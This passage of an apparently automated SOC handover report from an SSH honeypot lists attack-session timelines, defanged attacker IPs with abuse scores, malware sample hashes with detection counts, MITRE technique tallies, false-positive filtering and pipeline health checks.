| `2026-05-23 22:55:43` | `cowrie.command.failed` |
| `2026-05-23 22:55:43` | `cowrie.log.closed` |
| `2026-05-23 22:55:44` | `cowrie.session.params` |
| `2026-05-23 22:55:44` | `cowrie.command.input` |
| `2026-05-23 22:55:44` | `cowrie.session.file_download` |
| `2026-05-23 22:55:44` | `cowrie.log.closed` |
| `2026-05-23 22:55:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.174.5[.]146` to AbuseIPDB if not already reported
- [ ] Block `172.174.5[.]146` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe802d4bd838

| Field | Detail |
|---|---|
| **Source IP** | `172.174.5[.]146` |
| **First Seen** | 2026-05-23 22:55 |
| **Last Seen** | 2026-05-23 22:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 22:55:47` | `cowrie.session.connect` |
| `2026-05-23 22:55:47` | `cowrie.client.version` |
| `2026-05-23 22:55:47` | `cowrie.client.kex` |
| `2026-05-23 22:55:48` | `cowrie.login.success` |
| `2026-05-23 22:55:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.174.5[.]146` to AbuseIPDB if not already reported
- [ ] Block `172.174.5[.]146` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `223.123.125[.]9` | **25** | 2026-05-23 22:23 | 2026-05-23 22:28 | 5m | 0 | `T1592` | 🟠 MEDIUM |
| `180.167.207[.]234` | **16** | 2026-05-23 21:10 | 2026-05-23 21:31 | 18m | 7 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `102.23.122[.]235` | **15** | 2026-05-23 21:27 | 2026-05-23 22:31 | 0m | 15 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `113.108.13[.]168` | **15** | 2026-05-23 21:10 | 2026-05-23 21:30 | 17m | 5 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `14.1.16[.]230` | **11** | 2026-05-23 20:57 | 2026-05-23 22:43 | 7m | 0 | `T1592` | 🟠 MEDIUM |
| `197.227.14[.]33` | **9** | 2026-05-23 22:00 | 2026-05-23 22:53 | 0m | 9 | `T1110.001 · T1592` | 🟢 LOW |
| `172.174.5[.]146` | **6** | 2026-05-23 21:32 | 2026-05-23 22:55 | 0m | 6 | `T1110.001 · T1592` | 🟢 LOW |
| `186.22.19[.]183` | **3** | 2026-05-23 21:33 | 2026-05-23 21:49 | 0m | 3 | `T1110.001 · T1592` | 🟢 LOW |
| `45.148.120[.]187` | **3** | 2026-05-23 21:42 | 2026-05-23 22:52 | 3m | 0 | `T1592` | 🟢 LOW |
| `165.154.6[.]119` | **2** | 2026-05-23 21:06 | 2026-05-23 21:13 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `66.132.172[.]98` | **2** | 2026-05-23 22:03 | 2026-05-23 22:04 | 0m | 0 | `T1592` | 🟢 LOW |
| `1.15.51[.]236` | 1 | 2026-05-23 21:46 | 2026-05-23 21:46 | 31s | 0 | `T1592` | 🟢 LOW |
| `101.126.53[.]14` | 1 | 2026-05-23 21:19 | 2026-05-23 21:21 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.186.18[.]243` | 1 | 2026-05-23 21:36 | 2026-05-23 21:38 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.39[.]73` | 1 | 2026-05-23 21:21 | 2026-05-23 21:23 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.52.12[.]202` | 1 | 2026-05-23 21:27 | 2026-05-23 21:29 | 120s | 0 | `T1592` | 🟢 LOW |
| `148.222.212[.]72` | 1 | 2026-05-23 22:05 | 2026-05-23 22:05 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `174.3.120[.]68` | 1 | 2026-05-23 22:35 | 2026-05-23 22:35 | 12s | 0 | `T1592` | 🟢 LOW |
| `180.76.225[.]175` | 1 | 2026-05-23 21:26 | 2026-05-23 21:28 | 120s | 0 | `T1592` | 🟢 LOW |
| `181.116.220[.]140` | 1 | 2026-05-23 22:13 | 2026-05-23 22:13 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `190.220.172[.]154` | 1 | 2026-05-23 21:11 | 2026-05-23 21:11 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `88.231.120[.]252` | 1 | 2026-05-23 22:24 | 2026-05-23 22:24 | 12s | 0 | `T1592` | 🟢 LOW |
| `91.231.89[.]232` | 1 | 2026-05-23 21:02 | 2026-05-23 21:02 | 0s | 0 | `T1592` | 🟢 LOW |
| `91.231.89[.]235` | 1 | 2026-05-23 21:02 | 2026-05-23 21:02 | 3s | 0 | `T1592` | 🟢 LOW |
| `91.231.89[.]80` | 1 | 2026-05-23 21:04 | 2026-05-23 21:04 | 1s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (28 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 13/100 | 🟢 LOW | **33/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `223.123.125[.]9` | PK | CMPak Limited | **100** ⚠️ | 2 |
| `165.154.6[.]119` | HK | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | **100** ⚠️ | 14 |
| `186.22.19[.]183` | AR | Telecentro S.A. | **100** ⚠️ | 2 |
| `101.126.53[.]14` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 7 |
| `14.1.16[.]230` | AU | Real World Technology Solutions Pty Ltd | **100** ⚠️ | 0 |
| `190.220.172[.]154` | AR | Techtel LMDS Comunicaciones Interactivas S.A. | **100** ⚠️ | 19 |
| `91.231.89[.]80` | FR | FR ONYPHE | **100** ⚠️ | 50 |
| `120.48.39[.]73` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 50 |
| `43.226.39[.]177` | CN | Shenzhen Qianhai bird cloud computing Co. Ltd. | **100** ⚠️ | 16 |
| `102.23.122[.]235` | ZM | INFRATEL CORPORATION LIMITED | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 92 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 50 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 28 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 14 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 14 |

---

## 🔕 False Positive Summary (68 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 16 |
| AbuseIPDB score 1 below threshold 25 | 8 |
| AbuseIPDB score 21 below threshold 25 | 4 |
| AbuseIPDB score 22 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 8 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 31 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 217 cases |
| Tool 34  | Credential Extractor        | ✅ 78 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 6 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 41 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 68 filtered (31.3%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 35 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 28 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 28 priority case(s) shown individually · 25 recon entry/entries in table (11 group(s) consolidating 107 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-23T22:57:37Z_
